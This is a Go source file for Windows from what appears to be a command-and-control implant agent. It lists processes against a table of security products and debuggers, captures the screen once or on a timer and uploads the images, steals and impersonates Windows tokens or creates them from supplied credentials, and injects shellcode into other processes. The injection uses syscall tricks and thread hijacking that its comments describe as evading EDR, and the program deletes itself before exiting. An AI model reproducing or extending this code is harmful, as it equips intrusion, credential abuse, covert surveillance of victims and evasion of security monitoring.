//go:build windows

package agent

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	procEnumProcesses            = windows.NewLazySystemDLL("psapi.dll").NewProc("EnumProcesses")
	procGetProcessImageFileNameW = windows.NewLazySystemDLL("psapi.dll").NewProc("GetProcessImageFileNameW")
	procOpenProcessToken2        = windows.NewLazySystemDLL("advapi32.dll").NewProc("OpenProcessToken")
	procGetUserNameExW           = windows.NewLazySystemDLL("secur32.dll").NewProc("GetUserNameExW")
	procGetTokenInformation      = windows.NewLazySystemDLL("advapi32.dll").NewProc("GetTokenInformation")
	procLookupAccountSidW        = windows.NewLazySystemDLL("advapi32.dll").NewProc("LookupAccountSidW")
	procDuplicateTokenEx         = windows.NewLazySystemDLL("advapi32.dll").NewProc("DuplicateTokenEx")
	procImpersonateLoggedOnUser  = windows.NewLazySystemDLL("advapi32.dll").NewProc("ImpersonateLoggedOnUser")
	procLogonUserW               = windows.NewLazySystemDLL("advapi32.dll").NewProc("LogonUserW")
	procRevertToSelf2            = windows.NewLazySystemDLL("advapi32.dll").NewProc("RevertToSelf")
	procGetDesktopWindow         = windows.NewLazySystemDLL("user32.dll").NewProc("GetDesktopWindow")
	procGetDC                    = windows.NewLazySystemDLL("user32.dll").NewProc("GetDC")
	procReleaseDC                = windows.NewLazySystemDLL("user32.dll").NewProc("ReleaseDC")
	procGetSystemMetrics         = windows.NewLazySystemDLL("user32.dll").NewProc("GetSystemMetrics")
	procOpenWindowStation        = windows.NewLazySystemDLL("user32.dll").NewProc("OpenWindowStationW")
	procSetProcessWindowStation  = windows.NewLazySystemDLL("user32.dll").NewProc("SetProcessWindowStation")
	procGetProcessWindowStation  = windows.NewLazySystemDLL("user32.dll").NewProc("GetProcessWindowStation")
	procCloseWindowStation       = windows.NewLazySystemDLL("user32.dll").NewProc("CloseWindowStation")
	procOpenDesktop              = windows.NewLazySystemDLL("user32.dll").NewProc("OpenDesktopW")
	procSetThreadDesktop         = windows.NewLazySystemDLL("user32.dll").NewProc("SetThreadDesktop")
	procGetThreadDesktop         = windows.NewLazySystemDLL("user32.dll").NewProc("GetThreadDesktop")
	procCloseDesktop             = windows.NewLazySystemDLL("user32.dll").NewProc("CloseDesktop")
	procGetCurrentThreadId       = windows.NewLazySystemDLL("kernel32.dll").NewProc("GetCurrentThreadId")
	procCreateCompatibleDC       = windows.NewLazySystemDLL("gdi32.dll").NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap   = windows.NewLazySystemDLL("gdi32.dll").NewProc("CreateCompatibleBitmap")
	procSelectObject             = windows.NewLazySystemDLL("gdi32.dll").NewProc("SelectObject")
	procBitBlt                   = windows.NewLazySystemDLL("gdi32.dll").NewProc("BitBlt")
	procDeleteObject             = windows.NewLazySystemDLL("gdi32.dll").NewProc("DeleteObject")
	procDeleteDC                 = windows.NewLazySystemDLL("gdi32.dll").NewProc("DeleteDC")
	procGetDIBits                = windows.NewLazySystemDLL("gdi32.dll").NewProc("GetDIBits")
)

// ── Process list ─────────────────────────────────────────────────────────────

// securityTools maps lowercase process name → "Vendor — Product" label.
var securityTools = map[string]string{
	// Windows Defender / Microsoft Defender for Endpoint
	"msmpeng.exe":              "Microsoft — Defender AV",
	"nissrv.exe":               "Microsoft — Defender Network Inspection",
	"mssense.exe":              "Microsoft — Defender for Endpoint (EDR)",
	"sensendr.exe":             "Microsoft — Defender for Endpoint",
	"securityhealthservice.exe":"Microsoft — Security Health Service",
	"mpdefendercoreservice.exe":"Microsoft — Defender Core",
	"mpcmdrun.exe":             "Microsoft — Defender CLI",
	// Sysmon
	"sysmon.exe":               "Microsoft — Sysmon",
	"sysmon64.exe":             "Microsoft — Sysmon (x64)",
	// CrowdStrike Falcon
	"csfalconservice.exe":      "CrowdStrike — Falcon Sensor",
	"csfalconcontainer.exe":    "CrowdStrike — Falcon Container",
	"falcon-sensor.exe":        "CrowdStrike — Falcon Sensor",
	"csagent.exe":              "CrowdStrike — Falcon Agent",
	// SentinelOne
	"sentinelagent.exe":        "SentinelOne — Agent",
	"sentinelservicehost.exe":  "SentinelOne — Service Host",
	"sentinelhelperservice.exe":"SentinelOne — Helper",
	"sentinelstaticengine.exe": "SentinelOne — Static Engine",
	"sentinel.exe":             "SentinelOne — Agent",
	// Carbon Black
	"cbdefense.exe":            "VMware Carbon Black — Defense",
	"cbssvc.exe":               "VMware Carbon Black — Cloud",
	"repmgr.exe":               "VMware Carbon Black — Response",
	"reputils.exe":             "VMware Carbon Black — Utils",
	"cbremd.exe":               "VMware Carbon Black — EDR",
	"carbonblack.exe":          "VMware Carbon Black",
	// Sophos
	"savservice.exe":           "Sophos — AV Service",
	"sophosui.exe":             "Sophos — UI",
	"almon.exe":                "Sophos — AutoUpdate Monitor",
	"sophoscleanm.exe":         "Sophos — Clean",
	"hmpalert.exe":             "Sophos — HitmanPro.Alert",
	"sophosntpservice.exe":     "Sophos — NTP Service",
	"sophosfileintegrity.exe":  "Sophos — File Integrity",
	// Symantec / Broadcom
	"ccsvchost.exe":            "Symantec — Endpoint Protection",
	"smc.exe":                  "Symantec — Management Client",
	"rtvscan.exe":              "Symantec — AV Scanner",
	"nortonsecurity.exe":       "Norton — Security",
	"nsbu.exe":                 "Norton — Security",
	"sepwsc.exe":               "Symantec — WSC",
	// McAfee / Trellix
	"mcshield.exe":             "McAfee/Trellix — On-Access Scanner",
	"mfemms.exe":               "McAfee/Trellix — Management Service",
	"mfeann.exe":               "McAfee/Trellix — Agent",
	"mcafeeframework.exe":      "McAfee — Framework",
	"masvc.exe":                "McAfee/Trellix — Agent Service",
	"macmnsvc.exe":             "McAfee/Trellix — Common Manager",
	// Trellix / FireEye HX
	"xagt.exe":                 "Trellix/FireEye — Endpoint Agent",
	"hxtray.exe":               "FireEye — HX Tray",
	// Trend Micro
	"tmbmsrv.exe":              "Trend Micro — Behavior Monitor",
	"ds_agent.exe":             "Trend Micro — Deep Security Agent",
	"tmlisten.exe":             "Trend Micro — Listener",
	"tmccapp.exe":              "Trend Micro — Apex One",
	"ntrtscan.exe":             "Trend Micro — Real-time Scan",
	// Kaspersky
	"avp.exe":                  "Kaspersky — AV Process",
	"avpui.exe":                "Kaspersky — UI",
	"kavfs.exe":                "Kaspersky — File Scanner",
	"ksde.exe":                 "Kaspersky — Disk Encryption",
	"klnagent.exe":             "Kaspersky — Network Agent",
	// ESET
	"ekrn.exe":                 "ESET — Kernel Service",
	"egui.exe":                 "ESET — GUI",
	"eguiproxy.exe":            "ESET — GUI Proxy",
	"eamonm.exe":               "ESET — Access Monitor",
	// Bitdefender
	"bdagent.exe":              "Bitdefender — Agent",
	"vsserv.exe":               "Bitdefender — VS Service",
	"bdservicehost.exe":        "Bitdefender — Service Host",
	"epiclauncher.exe":         "Bitdefender — GravityZone",
	"bdredline.exe":            "Bitdefender — Redline",
	// Cylance / BlackBerry
	"cylancesvc.exe":           "Cylance — Service",
	"cylanceui.exe":            "Cylance — UI",
	"cyserver.exe":             "Cylance/Palo Alto — Cortex",
	// Palo Alto Cortex XDR
	"traps_agent.exe":          "Palo Alto — Cortex XDR",
	"cywarden.exe":             "Palo Alto — Cortex XDR Warden",
	"cyverak.exe":              "Palo Alto — Cortex XDR",
	"cortex.exe":               "Palo Alto — Cortex XDR",
	// Elastic
	"elastic-agent.exe":        "Elastic — Agent",
	"elastic-endpoint.exe":     "Elastic — Endpoint",
	"winlogbeat.exe":           "Elastic — Winlogbeat",
	// Malwarebytes
	"mbam.exe":                 "Malwarebytes — Scanner",
	"malwarebytes.exe":         "Malwarebytes — UI",
	"mbamservice.exe":          "Malwarebytes — Service",
	// Webroot
	"wrsa.exe":                 "Webroot — SecureAnywhere",
	"wrskyclient.exe":          "Webroot — Sky Client",
	// Tanium
	"taniumclient.exe":         "Tanium — Client",
	"taniumendpointindex.exe":  "Tanium — Endpoint Index",
	// Qualys
	"qualysagent.exe":          "Qualys — Cloud Agent",
	"qagent.exe":               "Qualys — Agent",
	// Rapid7 / InsightIDR
	"ir_agent.exe":             "Rapid7 — Insight Agent",
	// LogRhythm
	"scsm.exe":                 "LogRhythm — System Monitor",
	// Darktrace
	"darktrace.exe":            "Darktrace — Agent",
	// Cybereason
	"cybereason.exe":           "Cybereason — ActiveProbe",
	"minionhost.exe":           "Cybereason — Minion",
	// Cisco Secure (AMP)
	"sfc.exe":                  "Cisco — Secure Endpoint (AMP)",
	"ampdaemon.exe":            "Cisco — AMP Daemon",
	// Splunk
	"splunkd.exe":              "Splunk — Forwarder",
	// Cortex XSOAR / Demisto
	"demistoagent.exe":         "Palo Alto — XSOAR Agent",
	// Analysis / sandbox indicators
	"procmon.exe":              "SysInternals — Process Monitor [ANALYSIS]",
	"procmon64.exe":            "SysInternals — Process Monitor [ANALYSIS]",
	"procexp.exe":              "SysInternals — Process Explorer [ANALYSIS]",
	"procexp64.exe":            "SysInternals — Process Explorer [ANALYSIS]",
	"wireshark.exe":            "Wireshark — Packet Capture [ANALYSIS]",
	"fiddler.exe":              "Telerik — Fiddler [ANALYSIS]",
	"x64dbg.exe":               "x64dbg — Debugger [ANALYSIS]",
	"ollydbg.exe":              "OllyDbg — Debugger [ANALYSIS]",
	"idaq.exe":                 "IDA Pro — Disassembler [ANALYSIS]",
	"idaq64.exe":               "IDA Pro — Disassembler [ANALYSIS]",
}

// snapshotNames returns a PID→name map built from CreateToolhelp32Snapshot.
// No OpenProcess call needed — szExeFile is readable for all processes.
func snapshotNames() map[uint32]string {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil || snap == windows.InvalidHandle {
		return nil
	}
	defer windows.CloseHandle(snap)
	m := make(map[uint32]string)
	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	if err = windows.Process32First(snap, &pe); err != nil {
		return m
	}
	for {
		m[pe.ProcessID] = windows.UTF16ToString(pe.ExeFile[:])
		if err = windows.Process32Next(snap, &pe); err != nil {
			break
		}
	}
	return m
}

func listProcesses() (string, error) {
	pids := make([]uint32, 1024)
	var needed uint32
	r, _, err := procEnumProcesses.Call(
		uintptr(unsafe.Pointer(&pids[0])),
		uintptr(len(pids)*4),
		uintptr(unsafe.Pointer(&needed)),
	)
	if r == 0 {
		return "", fmt.Errorf("EnumProcesses: %w", err)
	}
	count := int(needed / 4)
	snap := snapshotNames()

	type secHit struct {
		pid   uint32
		name  string
		label string
	}
	var hits []secHit

	var sb strings.Builder
	fmt.Fprintf(&sb, "%-8s  %-40s  %s\n", "PID", "IMAGE", "SECURITY")
	fmt.Fprintf(&sb, "%-8s  %-40s  %s\n", "---", "-----", "--------")

	for i := 0; i < count; i++ {
		pid := pids[i]
		// Try full name via OpenProcess; fall back to snapshot szExeFile
		name := ""
		h, herr := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
		if herr == nil {
			nameBuf := make([]uint16, 260)
			procGetProcessImageFileNameW.Call(
				uintptr(h), uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(len(nameBuf)))
			windows.CloseHandle(h)
			name = windows.UTF16ToString(nameBuf)
			if idx := strings.LastIndexAny(name, `/\`); idx >= 0 {
				name = name[idx+1:]
			}
		}
		if name == "" {
			name = snap[pid] // szExeFile from snapshot — no privilege required
		}
		if name == "" {
			name = "<unknown>"
		}
		label := ""
		if vendor, ok := securityTools[strings.ToLower(name)]; ok {
			label = "[" + vendor + "]"
			hits = append(hits, secHit{pid, name, vendor})
		}
		fmt.Fprintf(&sb, "%-8d  %-40s  %s\n", pid, name, label)
	}

	if len(hits) > 0 {
		sb.WriteString("\n── Security Tools Detected ─────────────────────────────\n")
		for _, h := range hits {
			fmt.Fprintf(&sb, "  %-45s  pid %-6d  %s\n", h.label, h.pid, h.name)
		}
	} else {
		sb.WriteString("\n── No known security tools detected ────────────────────\n")
	}
	return sb.String(), nil
}

func listProcessesJSON() (string, error) {
	pids := make([]uint32, 1024)
	var needed uint32
	r, _, err := procEnumProcesses.Call(
		uintptr(unsafe.Pointer(&pids[0])),
		uintptr(len(pids)*4),
		uintptr(unsafe.Pointer(&needed)),
	)
	if r == 0 {
		return "", fmt.Errorf("EnumProcesses: %w", err)
	}
	count := int(needed / 4)
	snap := snapshotNames()

	type procEntry struct {
		PID      uint32 `json:"pid"`
		Name     string `json:"name"`
		Security string `json:"security,omitempty"`
	}
	procs := make([]procEntry, 0, count)
	for i := 0; i < count; i++ {
		pid := pids[i]
		name := ""
		h, herr := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
		if herr == nil {
			nameBuf := make([]uint16, 260)
			procGetProcessImageFileNameW.Call(
				uintptr(h), uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(len(nameBuf)))
			windows.CloseHandle(h)
			name = windows.UTF16ToString(nameBuf)
			if idx := strings.LastIndexAny(name, `/\`); idx >= 0 {
				name = name[idx+1:]
			}
		}
		if name == "" {
			name = snap[pid]
		}
		if name == "" {
			name = "<unknown>"
		}
		sec := ""
		if vendor, ok := securityTools[strings.ToLower(name)]; ok {
			sec = vendor
		}
		procs = append(procs, procEntry{PID: pid, Name: name, Security: sec})
	}

	b, marshalErr := json.Marshal(procs)
	if marshalErr != nil {
		return "", marshalErr
	}
	return string(b), nil
}

// ── Screenshot ────────────────────────────────────────────────────────────────

const (
	SM_CXSCREEN = 0
	SM_CYSCREEN = 1
	SRCCOPY     = 0x00CC0020
	BI_RGB      = 0
)

type BITMAPINFOHEADER struct {
	BiSize          uint32
	BiWidth         int32
	BiHeight        int32
	BiPlanes        uint16
	BiBitCount      uint16
	BiCompression   uint32
	BiSizeImage     uint32
	BiXPelsPerMeter int32
	BiYPelsPerMeter int32
	BiClrUsed       uint32
	BiClrImportant  uint32
}

// captureScreen returns a PNG-encoded screenshot as bytes.
func captureScreen() ([]byte, error) {
	const WINSTA_ALL_ACCESS = 0x037F
	const DESKTOP_ALL_ACCESS = 0x01FF

	hOrigWinSta, _, _ := procGetProcessWindowStation.Call()
	hWinSta, _, _ := procOpenWindowStation.Call(
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("WinSta0"))),
		0, WINSTA_ALL_ACCESS,
	)
	if hWinSta != 0 {
		procSetProcessWindowStation.Call(hWinSta)
	}

	tid, _, _ := procGetCurrentThreadId.Call()
	hOrigDesk, _, _ := procGetThreadDesktop.Call(tid)
	hDesk, _, _ := procOpenDesktop.Call(
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("Default"))),
		0, 0, DESKTOP_ALL_ACCESS,
	)
	if hDesk != 0 {
		procSetThreadDesktop.Call(hDesk)
	}

	defer func() {
		if hDesk != 0 {
			procSetThreadDesktop.Call(hOrigDesk)
			procCloseDesktop.Call(hDesk)
		}
		if hWinSta != 0 {
			procSetProcessWindowStation.Call(hOrigWinSta)
			procCloseWindowStation.Call(hWinSta)
		}
	}()

	w, _, _ := procGetSystemMetrics.Call(SM_CXSCREEN)
	h, _, _ := procGetSystemMetrics.Call(SM_CYSCREEN)
	width, height := int32(w), int32(h)
	if width <= 0 || height <= 0 {
		return nil, fmt.Errorf("invalid screen dimensions: %dx%d", width, height)
	}

	hdc, _, _ := procGetDC.Call(0)
	defer procReleaseDC.Call(0, hdc)

	hdcMem, _, _ := procCreateCompatibleDC.Call(hdc)
	defer procDeleteDC.Call(hdcMem)

	hbmp, _, _ := procCreateCompatibleBitmap.Call(hdc, uintptr(width), uintptr(height))
	defer procDeleteObject.Call(hbmp)

	procSelectObject.Call(hdcMem, hbmp)
	procBitBlt.Call(hdcMem, 0, 0, uintptr(width), uintptr(height), hdc, 0, 0, SRCCOPY)

	bih := BITMAPINFOHEADER{
		BiSize:        40,
		BiWidth:       width,
		BiHeight:      -height,
		BiPlanes:      1,
		BiBitCount:    32,
		BiCompression: BI_RGB,
	}
	pixSize := int(width) * int(height) * 4
	pixels := make([]byte, pixSize)
	procGetDIBits.Call(
		hdcMem, hbmp, 0, uintptr(height),
		uintptr(unsafe.Pointer(&pixels[0])),
		uintptr(unsafe.Pointer(&bih)),
		0,
	)

	// Detect empty capture (all-black pixels) — happens when agent runs in
	// Session 0 (wmiexec network logon) with no graphical desktop access.
	nonBlack := false
	sample := len(pixels)
	if sample > 65536 {
		sample = 65536
	}
	for i := 0; i < sample; i += 4 {
		if pixels[i] != 0 || pixels[i+1] != 0 || pixels[i+2] != 0 {
			nonBlack = true
			break
		}
	}
	if !nonBlack {
		return nil, fmt.Errorf("empty capture: agent is in a non-interactive session (Session 0) — no desktop access via WMI/service logon")
	}

	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
	for y := 0; y < int(height); y++ {
		for x := 0; x < int(width); x++ {
			i := (y*int(width) + x) * 4
			img.SetRGBA(x, y, color.RGBA{R: pixels[i+2], G: pixels[i+1], B: pixels[i], A: 255})
		}
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return nil, fmt.Errorf("png encode: %w", err)
	}
	return buf.Bytes(), nil
}

func takeScreenshot(t transport, taskID int64) (string, error) {
	data, err := captureScreen()
	if err != nil {
		return "", err
	}
	filename := "screenshot.png"
	if err := t.uploadFile(taskID, filename, data); err != nil {
		return "screenshot (base64 PNG):\n" + base64.StdEncoding.EncodeToString(data), nil
	}
	return fmt.Sprintf("screenshot saved: %s (%d bytes)", filename, len(data)), nil
}

// ── Token operations ──────────────────────────────────────────────────────────

var stolenToken windows.Token

// ── Token Store ───────────────────────────────────────────────────────────────

type tsEntry struct {
	ID   int
	PID  uint32
	User string
	tok  windows.Token
}

var tsStore struct {
	sync.Mutex
	entries []tsEntry
	nextID  int
}

func tsAdd(pid uint32, tok windows.Token) (int, string) {
	user := ""
	if info, err := tok.GetTokenUser(); err == nil {
		if acct, dom, _, err := info.User.Sid.LookupAccount(""); err == nil {
			user = dom + "\\" + acct
		}
	}
	tsStore.Lock()
	defer tsStore.Unlock()
	tsStore.nextID++
	tsStore.entries = append(tsStore.entries, tsEntry{ID: tsStore.nextID, PID: pid, User: user, tok: tok})
	return tsStore.nextID, user
}

func tsShow() string {
	tsStore.Lock()
	defer tsStore.Unlock()
	if len(tsStore.entries) == 0 {
		return "(token store empty)"
	}
	var sb strings.Builder
	for _, e := range tsStore.entries {
		fmt.Fprintf(&sb, "[%d] PID=%d user=%s\n", e.ID, e.PID, e.User)
	}
	return sb.String()
}

func tsUse(id int) string {
	tsStore.Lock()
	defer tsStore.Unlock()
	for _, e := range tsStore.entries {
		if e.ID == id {
			stolenToken = e.tok
			return fmt.Sprintf("[+] using token #%d (%s)", id, e.User)
		}
	}
	return fmt.Sprintf("[-] token #%d not found", id)
}

func tsRemove(id int) string {
	tsStore.Lock()
	defer tsStore.Unlock()
	for i, e := range tsStore.entries {
		if e.ID == id {
			e.tok.Close()
			tsStore.entries = append(tsStore.entries[:i], tsStore.entries[i+1:]...)
			return fmt.Sprintf("[+] token #%d removed", id)
		}
	}
	return fmt.Sprintf("[-] token #%d not found", id)
}

func tsClear() string {
	tsStore.Lock()
	defer tsStore.Unlock()
	for _, e := range tsStore.entries {
		e.tok.Close()
	}
	tsStore.entries = nil
	return "[+] token store cleared"
}

// stealTokenFromPID opens a process, duplicates its token, and returns it.
func stealTokenFromPID(pid uint32) (windows.Token, error) {
	h, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION,
		false, pid)
	if err != nil {
		return 0, fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(h)

	var tok windows.Token
	r, _, e := procOpenProcessToken2.Call(
		uintptr(h),
		uintptr(windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY|windows.TOKEN_IMPERSONATE),
		uintptr(unsafe.Pointer(&tok)),
	)
	if r == 0 {
		return 0, fmt.Errorf("OpenProcessToken: %w", e)
	}
	defer windows.CloseHandle(windows.Handle(tok))

	var dup windows.Token
	r, _, e = procDuplicateTokenEx.Call(
		uintptr(tok),
		uintptr(windows.TOKEN_ALL_ACCESS),
		0,
		2, // SecurityImpersonation
		1, // TokenImpersonation
		uintptr(unsafe.Pointer(&dup)),
	)
	if r == 0 {
		return 0, fmt.Errorf("DuplicateTokenEx: %w", e)
	}
	return dup, nil
}

func stealToken(pid int) (string, error) {
	h, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION,
		false, uint32(pid))
	if err != nil {
		return "", fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(h)

	var tok windows.Token
	r, _, e := procOpenProcessToken2.Call(
		uintptr(h),
		uintptr(windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY|windows.TOKEN_IMPERSONATE),
		uintptr(unsafe.Pointer(&tok)),
	)
	if r == 0 {
		return "", fmt.Errorf("OpenProcessToken: %w", e)
	}
	defer windows.CloseHandle(windows.Handle(tok))

	var dup windows.Token
	r, _, e = procDuplicateTokenEx.Call(
		uintptr(tok),
		uintptr(windows.TOKEN_ALL_ACCESS),
		0,
		2, // SecurityImpersonation
		1, // TokenImpersonation
		uintptr(unsafe.Pointer(&dup)),
	)
	if r == 0 {
		return "", fmt.Errorf("DuplicateTokenEx: %w", e)
	}

	r, _, e = procImpersonateLoggedOnUser.Call(uintptr(dup))
	if r == 0 {
		windows.CloseHandle(windows.Handle(dup))
		return "", fmt.Errorf("ImpersonateLoggedOnUser: %w", e)
	}
	stolenToken = dup
	return fmt.Sprintf("token stolen from PID %d, impersonating", pid), nil
}

func makeToken(userDomain, password string) (string, error) {
	domain := "."
	user := userDomain
	if idx := strings.IndexAny(userDomain, `\@`); idx >= 0 {
		if userDomain[idx] == '\\' {
			domain = userDomain[:idx]
			user = userDomain[idx+1:]
		} else {
			user = userDomain[:idx]
			domain = userDomain[idx+1:]
		}
	}
	userW, _ := windows.UTF16PtrFromString(user)
	domainW, _ := windows.UTF16PtrFromString(domain)
	passW, _ := windows.UTF16PtrFromString(password)

	var tok windows.Token
	r, _, e := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userW)),
		uintptr(unsafe.Pointer(domainW)),
		uintptr(unsafe.Pointer(passW)),
		2, // LOGON32_LOGON_INTERACTIVE
		0, // LOGON32_PROVIDER_DEFAULT
		uintptr(unsafe.Pointer(&tok)),
	)
	if r == 0 {
		return "", fmt.Errorf("LogonUser: %w", e)
	}
	r, _, e = procImpersonateLoggedOnUser.Call(uintptr(tok))
	if r == 0 {
		windows.CloseHandle(windows.Handle(tok))
		return "", fmt.Errorf("ImpersonateLoggedOnUser: %w", e)
	}
	if stolenToken != 0 {
		windows.CloseHandle(windows.Handle(stolenToken))
	}
	stolenToken = tok
	return fmt.Sprintf("token created for %s\\%s", domain, user), nil
}

func dropToken() (string, error) {
	if stolenToken != 0 {
		windows.CloseHandle(windows.Handle(stolenToken))
		stolenToken = 0
	}
	r, _, e := procRevertToSelf2.Call()
	if r == 0 {
		return "", fmt.Errorf("RevertToSelf: %w", e)
	}
	return "reverted to original token", nil
}

func tokenWhoami() string {
	// GetUserNameExW reads the effective identity of the calling thread: if the
	// thread is impersonating (via ImpersonateLoggedOnUser / SetThreadToken) it
	// returns the impersonated user; otherwise it returns the process user.
	// This is correct for both steal-token and make-token results.
	const NameSamCompatible = 2
	var buf [256]uint16
	var sz uint32 = 256
	r, _, _ := procGetUserNameExW.Call(NameSamCompatible,
		uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&sz)))
	if r != 0 {
		return windows.UTF16ToString(buf[:sz])
	}
	// Fallback: query the process token directly.
	var tok windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &tok); err != nil {
		return "error: " + err.Error()
	}
	defer tok.Close()
	u, err := tok.GetTokenUser()
	if err != nil {
		return "error getting token user: " + err.Error()
	}
	var nameLen, domainLen uint32
	var sidType uint32
	// Get sizes
	procLookupAccountSidW.Call(0, uintptr(unsafe.Pointer(u.User.Sid)),
		0, uintptr(unsafe.Pointer(&nameLen)),
		0, uintptr(unsafe.Pointer(&domainLen)),
		uintptr(unsafe.Pointer(&sidType)))
	nameW := make([]uint16, nameLen)
	domainW := make([]uint16, domainLen)
	procLookupAccountSidW.Call(0, uintptr(unsafe.Pointer(u.User.Sid)),
		uintptr(unsafe.Pointer(&nameW[0])), uintptr(unsafe.Pointer(&nameLen)),
		uintptr(unsafe.Pointer(&domainW[0])), uintptr(unsafe.Pointer(&domainLen)),
		uintptr(unsafe.Pointer(&sidType)))
	return windows.UTF16ToString(domainW) + `\` + windows.UTF16ToString(nameW)
}

// ── Remote injection ──────────────────────────────────────────────────────────

func injectRemote(pid int, sc []byte) error {
	h, err := windows.OpenProcess(
		windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|windows.PROCESS_CREATE_THREAD,
		false, uint32(pid))
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(h)

	// NtAllocateVirtualMemory via Hell's Gate (clean SSN + spoofed call-stack).
	var base uintptr
	size := uintptr(len(sc))
	if err := hgAllocateVirtualMemory(h, &base, &size,
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE); err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory: %w", err)
	}

	// WriteProcessMemory — hooks here are far less common than VirtualAllocEx.
	var written uintptr
	if err := windows.WriteProcessMemory(h, base, &sc[0], uintptr(len(sc)), &written); err != nil {
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}

	// NtProtectVirtualMemory via Hell's Gate → RX.
	var oldProt uint32
	sz := uintptr(len(sc))
	if err := ntProtectEx(h, base, sz, windows.PAGE_EXECUTE_READ, &oldProt); err != nil {
		return fmt.Errorf("NtProtectVirtualMemory: %w", err)
	}

	// NtCreateThreadEx via Hell's Gate.
	hThread, err := hgCreateThreadEx(h, base, 0)
	if err != nil {
		return fmt.Errorf("NtCreateThreadEx: %w", err)
	}
	windows.CloseHandle(hThread)
	return nil
}

// ── Thread-hijack injection into an existing running process ─────────────────
//
// Evasion advantages over classic VirtualAllocEx+CreateRemoteThread:
//   • Section mapping: no WriteProcessMemory, no VirtualAllocEx
//   • Thread hijacking: no CreateRemoteThread, no NtCreateThreadEx
//   • Thread-creation events are NOT generated → lower EDR signal

func injectRemoteHijack(pid int, sc []byte) (string, error) {
	hProc, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return "", fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	// Map shellcode into target — NtCreateSection + NtMapViewOfSection (no WPM)
	remoteAddr, err := injectViaSection(hProc, sc)
	if err != nil {
		return "", fmt.Errorf("section-map: %w", err)
	}

	// Enumerate threads to find one belonging to target PID
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return "", fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
	}
	defer windows.CloseHandle(snap)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	var targetTID uint32
	for err = windows.Thread32First(snap, &te); err == nil; err = windows.Thread32Next(snap, &te) {
		if te.OwnerProcessID == uint32(pid) {
			targetTID = te.ThreadID
			break
		}
	}
	if targetTID == 0 {
		return "", fmt.Errorf("no thread found in PID %d", pid)
	}

	hThread, err := windows.OpenThread(
		windows.THREAD_GET_CONTEXT|windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME,
		false, targetTID)
	if err != nil {
		return "", fmt.Errorf("OpenThread(%d): %w", targetTID, err)
	}
	defer windows.CloseHandle(hThread)

	var procSuspendThread = kernel32.NewProc("SuspendThread")
	r, _, e := procSuspendThread.Call(uintptr(hThread))
	if r == ^uintptr(0) {
		return "", fmt.Errorf("SuspendThread: %w", e)
	}

	if err := hijackThread(hThread, remoteAddr); err != nil {
		windows.ResumeThread(hThread)
		return "", fmt.Errorf("hijackThread: %w", err)
	}

	if _, err := windows.ResumeThread(hThread); err != nil {
		return "", fmt.Errorf("ResumeThread: %w", err)
	}

	return fmt.Sprintf("[+] thread-hijack: %d bytes mapped → PID %d TID %d @ 0x%x",
		len(sc), pid, targetTID, remoteAddr), nil
}

// ── Screenwatch ───────────────────────────────────────────────────────────────

var screenWatchCancel context.CancelFunc
var screenWatchMu sync.Mutex

func startScreenWatch(t transport, taskID int64, intervalSec int) {
	screenWatchMu.Lock()
	if screenWatchCancel != nil {
		screenWatchCancel()
	}
	ctx, cancel := context.WithCancel(context.Background())
	screenWatchCancel = cancel
	screenWatchMu.Unlock()

	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			case <-time.After(time.Duration(intervalSec) * time.Second):
				data, err := captureScreen()
				if err != nil {
					continue
				}
				fname := fmt.Sprintf("screen_%d.png", time.Now().Unix())
				t.uploadFile(taskID, fname, data) //nolint:errcheck
			}
		}
	}()
}

func stopScreenWatch() string {
	screenWatchMu.Lock()
	defer screenWatchMu.Unlock()
	if screenWatchCancel == nil {
		return "[-] screenwatch not running"
	}
	screenWatchCancel()
	screenWatchCancel = nil
	return "[+] screenwatch stopped"
}

// ── Self cleanup ──────────────────────────────────────────────────────────────

func selfCleanup() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	// Schedule deletion via cmd.exe after a short delay, then exit
	cmd := fmt.Sprintf(`/C ping -n 3 127.0.0.1 >nul & del /F /Q "%s"`, exe)
	c := exec.Command("cmd.exe", cmd)
	c.Start()
	os.Exit(0)
}

